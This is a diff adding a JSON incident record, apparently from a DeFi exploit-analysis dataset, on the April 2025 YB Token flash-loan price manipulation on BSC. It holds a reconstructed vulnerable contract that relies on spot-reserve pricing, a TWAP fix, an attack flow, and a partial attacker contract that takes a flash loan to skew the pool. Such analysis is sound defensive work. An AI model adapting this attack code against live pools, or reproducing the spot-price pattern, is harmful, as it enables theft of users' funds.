@@ -1,0 +1,32 @@
+{
+ "id": "2025__2025-04-14_YBToken_FlashLoanKManipulation",
+ "source_file": "2025/2025-04-14_YBToken_FlashLoanKManipulation.md",
+ "title": "YB Token — K-Value Manipulation via Flash Loan Analysis",
+ "date": "2025-04-14",
+ "protocol": "YB Token",
+ "chain": "BSC",
+ "loss_raw": "15,261 BUSD",
+ "loss_usd": null,
+ "root_cause": "Token price calculation relies on manipulable instantaneous LP reserve spot price, allowing price distortion via K-value manipulation",
+ "attack_tx": "0xe1e7fa81...",
+ "vulnerable_contract": "0x113F16A3341D32c4a38Ca207Ec6ab109cF63e434",
+ "classes": [
+  "flash-loan"
+ ],
+ "code_before": [
+  "❌ Vulnerable pattern: spot-reserve-based price reference\n// YB token's internal mechanism references the current reserves of the LP pool\nfunction getYBPrice() internal view returns (uint256) {\n    (uint112 r0, uint112 r1,) = IUniswapV2Pair(YB_BUSD_LP).getReserves();\n    return uint256(r1) * 1e18 / uint256(r0); //",
+  "❌ spot price\n}\n\n// Large swap after flash loan causes K-value imbalance\n// reserve0 * reserve1 = K (constant)\n// Massive token1 injection → reserve1 spikes → token0 price drops\n\n//",
+  "// ⚠️ RECONSTRUCTED — not verified source. Derived from PoC + on-chain trace.\n// Contract: 0x113F16A3341D32c4a38Ca207Ec6ab109cF63e434 (YBToken, BSC)\n\ncontract YBToken is IERC20 {\n    IUniswapV2Pair  public  pair;     // YB/BUSD PancakeSwap V2 pair\n    IUniswapV2Router02 public router;\n    uint256 public buyRate;           // set by owner (selector 0xfc37987b)\n    uint256 public sellRate;          // set by owner (selector 0x6217229b)\n\n    // ❌ Called on every token transfer — triggers auto-swap using spot reserves\n    function _transfer(address from, address to, uint256 amount) internal override {\n        if (to == address(pair)) {\n            // Sell path: swap YB → BUSD via router\n            // ❌ Router reads current pair reserves (spot price) — manipulable\n            address[] memory path = new address[](2);\n            path[0] = address(this);\n            path[1] = BUSD;\n            router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n                amount * sellRate / 100,  // ❌ sellRate applied to spot price\n                0,                        // ❌ no minimum out (amountOutMin=0)\n                path,\n                feeReceiver,\n                block.timestamp\n            );\n        } else if (from == address(pair)) {\n            // Buy path: swap BUSD → YB — quantity computed from spot reserves\n            // ❌ getAmountsOut uses manipulated reserves after flash-loan swap\n            address[] memory path = new address[](2);\n            path[0] = BUSD;\n            path[1] = address(this);\n            uint256 busdIn = getTokenValue(amount); // ❌ spot-price lookup\n            router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n                busdIn * buyRate / 100,\n                0,\n                path,\n                feeReceiver,\n                block.timestamp\n            );\n        }\n        super._transfer(from, to, amount);\n    }\n\n    // ❌ Spot-price oracle — reads live pair reserves, not TWAP\n    function getTokenValue(uint256 amount) public view returns (uint256) {\n        (uint112 r0, uint112 r1,) = IUniswapV2Pair(pair).getReserves(); // ❌\n        // r0 = YB reserve, r1 = BUSD reserve\n        return uint256(r1) * amount / uint256(r0);  // ❌ spot price, manipulable\n    }\n}"
+ ],
+ "code_after": [
+  "✅ Use TWAP-based price\nfunction getYBPrice() internal view returns (uint256) {\n    return IOracle(twapOracle).consult(YB, BUSD); //",
+  "✅ manipulation-resistant\n}"
+ ],
+ "steps": [
+  "► reserve(BUSD) spikes → YB price drops"
+ ],
+ "other_code": [
+  "Attacker\n  │\n  ├─[1]─► PancakeSwap V3 Flash Loan (borrow 19,200 BUSD)\n  │         └─► Magic number: loanAmount = 19200000000000000000000\n  │\n  ├─[2]─► Inject large BUSD to imbalance K-value of YB/BUSD pool\n  │         └─► reserve(BUSD) spikes → YB price drops\n  │\n  ├─[3]─► Buy large amount of YB tokens at depressed price\n  │\n  ├─[4]─► K-value normalizes, YB price recovers\n  │\n  ├─[5]─► Sell held YB back to BUSD (after price recovery)\n  │\n  ├─[6]─► Repay flash loan\n  │\n  └─[7]─► Net profit: 15,261 BUSD",
+  "contract AttackerC {\n    uint256 loanAmount = 19200000000000000000000; // Optimal attack amount (magic number)\n\n    function attack() external payable {\n        // [1] Borrow BUSD via PancakeV3 flash loan\n        IPancakeV3Pool(pancakeV3Pool).flash(\n            address(this),\n            loanAmount, // borrow BUSD\n            0,\n            \"\"\n        );\n    }\n\n    function pancakeV3FlashCallback(\n        uint256 fee0,\n        uint256 fee1,\n        bytes calldata\n    ) external {\n        // [2] Calculate current K-value of the YB/BUSD LP pool\n        (uint112 r0, uint112 r1,) = IUniswapV2Pair(YB_BUSD_LP).getReserves();\n        uint256 currentK = uint256(r0) * uint256(r1);\n\n        // [3] Calculate optimal swap amount to manipulate K-value\n        uint256 amount1ToSwap = getAmount1ToReachK("
+ ]
+}
